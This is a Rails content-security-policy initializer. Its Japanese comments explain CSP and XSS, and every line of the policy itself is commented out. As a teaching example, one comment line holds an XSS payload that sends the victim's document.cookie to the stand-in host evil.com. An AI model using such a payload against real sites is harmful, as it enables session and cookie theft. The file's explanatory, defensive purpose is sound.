# config/initializers/content_security_policy.rb
# ==========================================
# コンテンツセキュリティポリシー（CSP）設定
# ==========================================
#
# 【このファイルの役割】
# ブラウザが読み込むリソース（スクリプト、スタイル、画像など）を
# 制限するセキュリティ設定を定義する。
#
# 【CSP（Content Security Policy）とは？】
# XSS（クロスサイトスクリプティング）攻撃を防ぐための
# ブラウザセキュリティ機能。
#
# 【XSS攻撃の例】
#
#   攻撃者がコメント欄に悪意あるスクリプトを投稿:
#   <script>document.location='https://evil.com/?cookie='+document.cookie</script>
#
#   CSPなし: スクリプトが実行され、Cookieが盗まれる！
#   CSPあり: 許可されていないソースからのスクリプトは実行されない
#
# 【現在の状態】
# このファイルでは全てコメントアウトされている（無効）。
# 必要に応じて有効化する。
#
# 【有効化時の注意】
# CSPを有効にすると、インラインスクリプトや
# 外部CDNからの読み込みがブロックされる場合がある。
# YouTube埋め込みなども影響を受けるので、
# 慎重に設定する必要がある。
#
# Be sure to restart your server when you modify this file.
#
# Define an application-wide content security policy.
# See the Securing Rails Applications Guide for more information:
# https://guides.rubyonrails.org/security.html#content-security-policy-header

# ------------------------------------------
# CSP設定例（コメントアウト状態）
# ------------------------------------------
# 【各ディレクティブの意味】
#
# default_src: デフォルトのソース制限
# font_src:    フォントの読み込み元
# img_src:     画像の読み込み元
# object_src:  <object>, <embed> タグの制限
# script_src:  JavaScriptの読み込み元
# style_src:   CSSの読み込み元
#
# :self  → 同じオリジン（ドメイン）のみ許可
# :https → HTTPS経由のみ許可
# :none  → 一切許可しない
# :data  → data: URI を許可
#
# Rails.application.configure do
#   config.content_security_policy do |policy|
#     policy.default_src :self, :https
#     policy.font_src    :self, :https, :data
#     policy.img_src     :self, :https, :data
#     policy.object_src  :none
#     policy.script_src  :self, :https
#     policy.style_src   :self, :https
#     # Specify URI for violation reports
#     # policy.report_uri "/csp-violation-report-endpoint"
#   end
#
#   # Generate session nonces for permitted importmap, inline scripts, and inline styles.
#   config.content_security_policy_nonce_generator = ->(request) { request.session.id.to_s }
#   config.content_security_policy_nonce_directives = %w(script-src style-src)
#
#   # Report violations without enforcing the policy.
#   # config.content_security_policy_report_only = true
# end
